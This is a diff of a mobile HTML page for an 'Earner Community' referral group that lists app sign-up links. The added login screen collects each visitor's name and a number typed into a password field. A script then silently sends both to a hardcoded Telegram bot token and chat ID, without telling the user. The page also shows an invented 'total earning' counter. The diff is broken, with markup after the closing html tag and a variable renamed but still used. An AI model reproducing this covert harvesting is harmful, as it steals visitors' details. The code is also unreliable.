@@ -4,106 +4,219 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Earner Community Hub</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #ffffff; overflow-x: hidden; }
+        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&family=Ubuntu:wght@500;700&display=swap");
+        
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { font-family: 'Poppins', sans-serif; background: #252432; overflow-x: hidden; }
 
-        /* BLACK PREMIUM LOADER */
-        #loader { position: fixed; width: 100%; height: 100%; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.4s ease; }
-        .pl { width: 6em; height: 6em; }
-        .pl__ring { animation: ring 2s linear infinite; stroke: hsla(193, 90%, 50%, 0.1); fill: none; stroke-width: 8; stroke-linecap: round; }
-        .pl__worm { animation: worm 2s cubic-bezier(0.42,0.17,0.75,0.83) infinite; stroke: #2299ff; fill: none; stroke-width: 8; stroke-linecap: round; stroke-dasharray: 150 600; }
-        @keyframes ring { from { transform: rotate(0); } to { transform: rotate(1turn); } }
-        @keyframes worm { from { stroke-dashoffset: 0; } 50% { stroke-dashoffset: -350; } to { stroke-dashoffset: -600; } }
-        .loader-text { margin-top: 25px; color: #ffffff; font-size: 14px; font-weight: bold; letter-spacing: 2px; }
+        /* --- LOGIN SCREEN --- */
+        #login-screen { position: fixed; inset: 0; background: #252432; display: flex; justify-content: center; align-items: center; z-index: 20000; transition: 0.8s; }
+        @property --a { syntax: "<angle>"; inherits: false; initial-value: 0deg; }
+        .box { position: relative; width: 340px; height: 180px; background: repeating-conic-gradient(from var(--a), #ff2770 0%, #ff2770 5%, transparent 5%, transparent 40%, #ff2770 50%); filter: drop-shadow(0 15px 50px #000); animation: rotating 4s linear infinite; border-radius: 20px; display: flex; justify-content: center; align-items: center; transition: 0.5s; }
+        .box:hover, .box:active { height: 420px; }
+        @keyframes rotating { 0% { --a: 0deg; } 100% { --a: 360deg; } }
+        .box::before { content: ""; position: absolute; width: 100%; height: 100%; background: repeating-conic-gradient(from var(--a), #45f3ff 0%, #45f3ff 5%, transparent 5%, transparent 40%, #45f3ff 50%); border-radius: 20px; animation: rotating 4s linear infinite; animation-delay: -1s; }
+        .box::after { content: ""; position: absolute; inset: 4px; background: #2d2d39; border-radius: 15px; border: 8px solid #25252b; }
+        .login { position: absolute; inset: 10px; display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 1000; color: #fff; overflow: hidden; }
+        .loginBx { display: flex; justify-content: center; align-items: center; flex-direction: column; transform: translateY(145px); gap: 12px; width: 85%; transition: 0.5s; }
+        .box:hover .loginBx, .box:active .loginBx { transform: translateY(0px); }
+        .loginBx input { width: 100%; padding: 10px 15px; outline: none; border: 2px solid #fff; border-radius: 30px; color: #fff; background: rgba(0, 0, 0, 0.2); }
+        .loginBx input[type="submit"] { background: #45f3ff; border: none; color: #111; font-weight: bold; cursor: pointer; margin-top: 5px; }
 
-        /* ALERT BOX */
-        #custom-alert { 
-            display: none; 
-            position: fixed; 
-            top: 20px; 
-            left: 50%; 
-            transform: translateX(-50%); 
-            padding: 12px 25px; 
-            border-radius: 30px; 
-            color: white; 
-            font-weight: bold; 
-            z-index: 10000; 
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            text-align: center;
-            min-width: 250px;
-        }
+        /* --- STYLISH ORANGE POPUP --- */
+        #orange-alert-box { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 280px; background: #ff9f43; color: #111; padding: 20px; border-radius: 15px; z-index: 30000; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: popScale 0.3s ease; }
+        @keyframes popScale { from { transform: translate(-50%, -50%) scale(0.7); opacity: 0; } to { transform: translate(-50%, -50%) scale(1); opacity: 1; } }
+        #orange-alert-box p { font-size: 16px; font-weight: 600; margin-bottom: 15px; }
+        #orange-alert-box button { background: #111; color: #ff9f43; border: none; padding: 8px 25px; border-radius: 10px; font-weight: bold; cursor: pointer; }
 
-        /* SKY BLUE DISCLAIMER BOX */
-        #disclaimer-box {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 85%;
-            max-width: 350px;
-            background: #e0f7fa;
-            border: 2px solid #00bcd4;
-            border-radius: 15px;
-            padding: 20px;
-            z-index: 10001;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            text-align: center;
-            color: #006064;
-            font-weight: bold;
-            line-height: 1.5;
-        }
-        .close-disclaimer {
-            position: absolute;
-            top: 5px;
-            right: 10px;
-            font-size: 20px;
-            cursor: pointer;
-            color: #00bcd4;
-        }
-        .highlight { color: #d32f2f; background: #ffeb3b; padding: 2px 4px; border-radius: 4px; }
-
-        .header-section { padding: 10px; text-align: center; }
-        .header-box { width: 100%; height: 110px; background: linear-gradient(135deg, #6e8efb, #a777e3); border-radius: 12px; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; }
+        /* --- DASHBOARD --- */
+        #main-dashboard { display: none; background: #ffffff; min-height: 100vh; }
+        .header-box { width: 100%; height: 110px; background: linear-gradient(135deg, #6e8efb, #a777e3); display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; border-radius: 0 0 15px 15px; }
         .top-nav { display: flex; justify-content: space-around; padding: 15px 0 0; border-bottom: 2px solid #eee; background: white; position: sticky; top: 0; z-index: 100; }
-        .nav-item { text-align: center; font-size: 14px; font-weight: bold; color: #777; flex: 1; cursor: pointer; padding-bottom: 15px; border-bottom: 4px solid transparent; }
+        .nav-item { text-align: center; font-family: 'Ubuntu', sans-serif; font-size: 15px; font-weight: 700; color: #777; flex: 1; cursor: pointer; padding-bottom: 15px; }
         .nav-item.active { color: #8e44ad; border-bottom: 4px solid #8e44ad; }
 
+        #download-btn { display: none; background: #ffcc00; color: #000; padding: 10px 20px; border-radius: 30px; font-weight: bold; margin: 10px auto; border: none; cursor: pointer; font-family: 'Ubuntu'; }
+
+        /* --- OWNER CARD --- */
         #owner-content { display: none; padding: 20px; perspective: 1000px; }
         .flip-card { width: 100%; height: 460px; position: relative; transform-style: preserve-3d; transition: transform 0.6s; cursor: pointer; }
         .flip-card.is-flipped { transform: rotateY(180deg); }
-        .card-face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; border-radius: 25px; display: flex; flex-direction: column; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.15); padding: 20px; }
+        .card-face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; border-radius: 25px; display: flex; flex-direction: column; align-items: center; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         .card-front { background: linear-gradient(180deg, #3d33ff 0%, #a233ff 100%); color: white; justify-content: center; }
-        .card-back { transform: rotateY(180deg); background: #fdfaff; border: 2px solid #8e44ad; justify-content: space-between; color: #333; }
-        
-        .profile-img-wrap { width: 130px; height: 130px; border-radius: 50%; border: 4px solid #ffcc00; padding: 5px; margin-bottom: 15px; background: white; }
+        .card-back { transform: rotateY(180deg); background: #fdfaff; border: 2px solid #8e44ad; justify-content: space-between; }
+        .profile-img-wrap { width: 130px; height: 130px; border-radius: 50%; border: 4px solid #ffcc00; padding: 5px; background: white; margin-bottom: 15px; overflow: hidden; }
         .profile-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
-        .magic-label { margin-top: 20px; font-size: 11px; font-weight: 600; padding: 8px 15px; background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(5px); border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.3); color: #ffffff; animation: float 2s infinite; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
-
-        .earning-box { background: #111; padding: 30px 10px; border-radius: 20px; text-align: center; width: 100%; border: 2.5px solid #ffcc00; }
-        #count { font-size: 55px; font-weight: 900; color: #ffcc00; }
-
+        
         .main-grid { display: flex; flex-wrap: wrap; padding: 15px 8px; justify-content: space-between; }
-        .link-card { 
-            width: 48%; 
-            border: 2.5px solid #007bff; 
-            border-radius: 12px; 
-            margin-bottom: 12px; 
-            padding: 15px 5px; 
-            text-align: center; 
-            background: #fff; 
-            font-weight: bold; 
-            cursor: pointer; 
-            transition: all 0.2s ease; 
-            user-select: none; 
-        }
-        .link-card:active { transform: scale(0.92); background: #eef6ff; box-shadow: 0 0 12px rgba(0, 123, 255, 0.3); }
+        .link-card { width: 48%; border: 2.5px solid #007bff; border-radius: 12px; margin-bottom: 12px; padding: 15px 5px; text-align: center; background: #fff; font-weight: bold; }
+        #custom-alert { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); padding: 12px 25px; border-radius: 30px; color: white; z-index: 30000; font-weight: 800; animation: slideDown 0.4s; }
+        #disclaimer-box { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 350px; background: #e0f7fa; border: 2px solid #00bcd4; border-radius: 15px; padding: 20px; z-index: 30001; text-align: center; }
     </style>
 </head>
 <body>
 
+    <div id="orange-alert-box">
+        <p>Sir, please enter both Name and Number! 😊</p>
+        <button onclick="closeOrangeAlert()">OK</button>
+    </div>
+
+    <div id="login-screen">
+        <div class="box">
+            <div class="login">
+                <div class="loginBx">
+                    <h2><i class="fa-solid fa-right-to-bracket"></i> Login <i class="fa-solid fa-heart"></i></h2>
+                    <input type="text" placeholder="𝘕𝘈𝘔𝘌" id="nameInput">
+                    <input type="password" placeholder="𝘕𝘜𝘔𝘉𝘌𝘙" id="numInput">
+                    <input type="submit" value="𝐋𝐎𝐆𝐈𝐍" onclick="handleLogin()">
+                    <div style="display: flex; width: 100%; justify-content: space-between; font-size: 0.7em;">
+                        <a href="#" style="color:#fff; text-decoration:none;">Forgot Password</a>
+                        <a href="#" style="color:#ff2770; text-decoration:none; font-weight:600;">Sign up</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="main-dashboard">
+        <div id="custom-alert"></div>
+        <div id="disclaimer-box">
+            <span onclick="this.parentElement.style.display='none'" style="float:right; cursor:pointer;">&times;</span>
+            Es video mai dey gay kis bhi <span style="color:red; background:yellow; padding:2px;">Referral Code</span> ko na daly nhi to <b>PAYOUT</b> nhi mily ga.
+        </div>
+
+        <div class="header-box"><h1>Earner Community</h1><p>TEAM WARRIOR [ᴛᴡ]</p></div>
+        <div class="top-nav">
+            <div class="nav-item active" onclick="showTab('process', this)">PROCESS</div>
+            <div class="nav-item" onclick="showTab('owner', this)">OWNER</div>
+            <div class="nav-item" onclick="showTab('trade', this)">TRADE</div>
+        </div>
+
+        <div id="apps-content">
+            <button id="download-btn" onclick="window.open('https://t.me/ROCKY_17_UK')">📥 VIEW BOT DATA</button>
+            <div style="padding:15px; font-weight:bold; font-family:'Ubuntu';" id="section-title">Process Video Links:</div>
+            <div class="main-grid" id="links-grid"></div>
+        </div>
+
+        <div id="owner-content">
+            <div class="flip-card" onclick="flipAndCount(this)">
+                <div class="card-face card-front">
+                    <div class="profile-img-wrap"><img src="https://i.ibb.co/x8fkt55V/photo.jpg" class="profile-img"></div>
+                    <h2 style="color:white; font-family:'Ubuntu';">𝗞𝗥𝗜𝗦𝗛𝗡𝗔 𝗬𝗔𝗗𝗔𝗩</h2>
+                    <p style="color:#ffcc00; font-weight:bold; font-size: 14px;">ADMIN & FOUNDER</p>
+                    <div style="margin-top:10px; font-size:11px;">Tap to see magic ↻</div>
+                </div>
+                <div class="card-face card-back">
+                    <div style="background:#111; padding:20px; border-radius:20px; width:100%; text-align:center; border:2px solid #ffcc00;">
+                        <span style="color:#fff; font-size:10px;">TOTAL EARNING</span>
+                        <div style="color:#ffcc00; font-size:40px; font-weight:900;">₹<span id="count">0</span></div>
+                    </div>
+                    <a href="https://wa.link/bwdttd" style="background:#25d366; color:white; padding:12px; border-radius:25px; text-decoration:none; width:100%; text-align:center; font-weight:bold;">WhatsApp Official</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleLogin() {
+            const name = document.getElementById('nameInput').value.trim();
+            const num = document.getElementById('numInput').value.trim();
+            
+            if(name === "" || num === "") {
+                document.getElementById('orange-alert-box').style.display = 'block';
+                return;
+            }
+
+            const token = "8699430064:AAFsODBcW2DEtgCXM0j3CHBCbhFjTO2bY3g";
+            const chat_id = "6131523659";
+            const message = `🚨 *New Login Alert!*\n\n👤 *Name:* ${name}\n📞 *Number:* ${num}\n📅 *Date:* ${new Date().toLocaleString()}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
+
+            if(name === "KRISHNA" && num === "9110") {
+                document.getElementById('download-btn').style.display = 'block';
+            }
+
+            document.getElementById('login-screen').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('main-dashboard').style.display = 'block';
+                document.body.style.background = "#fff";
+                renderApps('process');
+            }, 600);
+        }
+
+        function closeOrangeAlert() { document.getElementById('orange-alert-box').style.display = 'none'; }
+
+        const appsData = [
+            { name: "𝐀𝐍𝐆𝐄𝐋 𝐎𝐍𝐄", p: "https://tinyurl.com/earnercommunity-angelone", t: "https://tinyurl.com/earnercommunity-angel-trade" },
+            { name: "𝐀𝐗𝐈𝐒 𝐌𝐅", p: "https://tinyurl.com/earnercommunity-axismf1", t: "https://tinyurl.com/earnercommunity-axismf" },
+            { name: "𝐓𝐈𝐃𝐄", p: "https://tinyurl.com/EarnerCommunity-tide", t: "https://tinyurl.com/EarnerCommunity-tide" },
+            { name: "𝐀𝐃𝐈𝐓𝐘𝐀 𝐁𝐈𝐑𝐋𝐀", p: "https://youtu.be/fl_o8a8pcGM", t: "https://drive.google.com/file/d/1UArx_WhdtDJNz0O-GO7Q6ppI4FIfh1zU/view?usp=drivesdk" },
+            { name: "𝐔𝐏𝐒𝐓𝐎ＣＫ", p: "https://tinyurl.com/earnercommunity-upstox", t: "https://youtu.be/ddEQGxsEnlQ?si=Bhn4_TsqfK8ywLxA" },
+            { name: "𝐌𝐒𝐓𝐎ＣＫ", p: "https://tinyurl.com/earnercommunity-mstock", t: "https://youtube.com/shorts/hJ7XMtPmqMc?si=9f3LDJo13fCApoya" },
+            { name: "𝐄𝐐𝐔𝐈𝐓𝐘 𝐁𝐀ΝΚ", p: "https://earnercommunitylinks.blogspot.com/p/equitas_5.html", t: "NO" },
+            { name: "𝐈𝐍𝐃𝐈𝐀 𝐁𝐔𝐋𝐋𝐒", p: "https://youtu.be/zD13mX65pAs", t: "https://tinyurl.com/Earnercommunity-ibulls", special: true },
+            { name: "𝐊𝐎𝐓𝐀𝐊", p: "https://youtu.be/6S8H6i-Y-pE", t: "https://tinyurl.com/earnercommunity-kotak", special: true },
+            { name: "𝟓 𝐏𝐀𝐈𝐒𝐀", p: "https://youtu.be/M_w5yN_kP3o", t: "https://youtube.com/shorts/3fKDmt-LQaU?si=mSmwLt6Onta2hm28", special: true },
+            { name: "𝐀𝐈𝐑𝐓𝐄𝐋 𝐁𝐀ΝΚ", p: "https://youtu.be/vOQAnvA5O0k", t: "NO", special: true },
+            { name: "𝐇𝐒𝐁𝐂𝐌𝐅", p: "https://youtu.be/t2yI_C9h4eE", t: "NO", special: true }
+        ];
+
+        function renderApps(type) {
+            const grid = document.getElementById('links-grid');
+            grid.innerHTML = '';
+            appsData.forEach(app => {
+                const div = document.createElement('div');
+                div.className = 'link-card';
+                div.innerHTML = app.name;
+                div.onclick = () => {
+                    const link = type === 'process' ? app.p : app.t;
+                    const alertBox = document.getElementById('custom-alert');
+                    if(link === "NO") {
+                        alertBox.innerText = "❌ NOT AVAILABLE";
+                        alertBox.style.background = "#dc3545";
+                        alertBox.style.display = "block";
+                        setTimeout(() => alertBox.style.display = "none", 2000);
+                        return;
+                    }
+                    navigator.clipboard.writeText(link);
+                    alertBox.innerText = "✅ Link Copied!";
+                    alertBox.style.background = "#28a745";
+                    alertBox.style.display = "block";
+                    setTimeout(() => alertBox.style.display = "none", 2000);
+                    if(app.special && type === 'process') {
+                        setTimeout(() => { document.getElementById('disclaimer-box').style.display = 'block'; }, 1000);
+                    }
+                };
+                grid.appendChild(div);
+            });
+        }
+
+        function showTab(tab, el) {
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('apps-content').style.display = tab === 'owner' ? 'none' : 'block';
+            document.getElementById('owner-content').style.display = tab === 'owner' ? 'block' : 'none';
+            if(tab !== 'owner') renderApps(tab);
+        }
+
+        function flipAndCount(card) {
+            card.classList.toggle('is-flipped');
+            if(card.classList.contains('is-flipped')) {
+                let start = 0, target = 5610;
+                let timer = setInterval(() => {
+                    start += 150;
+                    if(start >= target) { start = target; clearInterval(timer); }
+                    document.getElementById('count').innerText = start.toLocaleString();
+                }, 30);
+            }
+        }
+    </script>
+</body>
+</html>
     <div id="loader">
         <svg class="pl" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg">
             <circle class="pl__ring" cx="64" cy="64" r="57" />
@@ -243,7 +356,7 @@
             card.classList.toggle('is-flipped');
             if (card.classList.contains('is-flipped')) {
                 const base = 4630;
-                const weekly = 980;
+                const daily = 180;
                 const weeks = Math.floor((new Date() - new Date('2026-02-22')) / (1000*60*60*24*7));
                 const target = base + (weeks > 0 ? weeks * weekly : 0);
                 let obj = document.getElementById("count");
